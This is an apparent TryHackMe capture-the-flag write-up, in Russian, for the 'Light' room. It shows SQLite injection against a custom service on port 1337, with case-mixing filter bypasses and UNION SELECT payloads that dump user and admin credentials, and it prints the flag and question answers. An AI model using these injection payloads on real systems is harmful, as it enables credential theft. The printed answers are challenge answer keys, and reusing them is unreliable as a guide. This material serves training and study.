# Write-up: Light

## Enum

Сканируем цель:

```bash
nmap -sS -sV -sC -p- --min-rate=1000 <TARGET-IP>
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
1337/tcp open  waste?
| fingerprint-strings:
|   GenericLines:
|     Welcome to the Light database!
|     Please enter your username: Username not found.
|     Please enter your username:
|   NULL:
|     Welcome to the Light database!
|_    Please enter your username:
```

Порт `1337` отдаёт баннер «Light database» и просит имя пользователя — похоже на самописную БД на сокете.

## Port 1337

Подключаемся:

```bash
nc 10.146.142.186 1337
```

```text
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```

Сервис явно работает с базой. Проверяем, есть ли SQL-инъекция — вводим `'`:

```text
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
```

Ошибка SQLite. Пробуем `' SELECT 1;`:

```text
Please enter your username: ' SELECT 1;
Ahh there is a word in there I don't like :(
```

Стоит фильтр на ключевые слова. Обходим регистром:

```text
Please enter your username: ' UnIoN SeLeCt 1 -- ;
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

Комментарии тоже фильтруются. Замечаем, что если добавить кавычку в конце, всё работает:

```text
Please enter your username: ' UnIoN SeLecT 1 '
Password: 1
```

Инъекция подтверждена. Заодно понимаем, что SQLite.

## Определение версии

```text
Please enter your username: ' UnIoN SeLecT sqlite_version() '
Password: 3.31.1
```

## Таблицы в БД

Смотрим `sqlite_master`:

```text
Please enter your username: ' UnIoN SeLeCt group_concat(sql) FROM sqlite_master '
Password: CREATE TABLE usertable (
              id INTEGER PRIMARY KEY,
              username TEXT,
              password INTEGER),CREATE TABLE admintable (
              id INTEGER PRIMARY KEY,
              username TEXT,
              password INTEGER)
```

Есть две таблицы: `usertable` и `admintable`.

## usertable

```text
Please enter your username: 'UnIoN SeLeCt group_concat(username) FROM usertable '
Password: alice,rob,john,michael,smokey,hazel,ralph,steve
```

## admintable

```text
Please enter your username: 'UnIoN SeLeCt group_concat(username) FROM admintable '
Password: TryHackMeAdmin,flag
```

```text
Please enter your username: 'UnIoN SeLeCt group_concat(password) FROM admintable '
Password: mamZtAuMlrsEy5bp6q17,THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

## Ответы на вопросы

**What is the admin username?**

```text
TryHackMeAdmin
```

**What is the password to the username mentioned in question 1?**

```text
mamZtAuMlrsEy5bp6q17
```

**What is the flag?**

```text
THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

## Итоговая схема (Kill Chain)

`Сервис на 1337` → `SQLi (SQLite, обход фильтров регистром)` → `sqlite_master` → `usertable`/`admintable` → `admin creds + flag`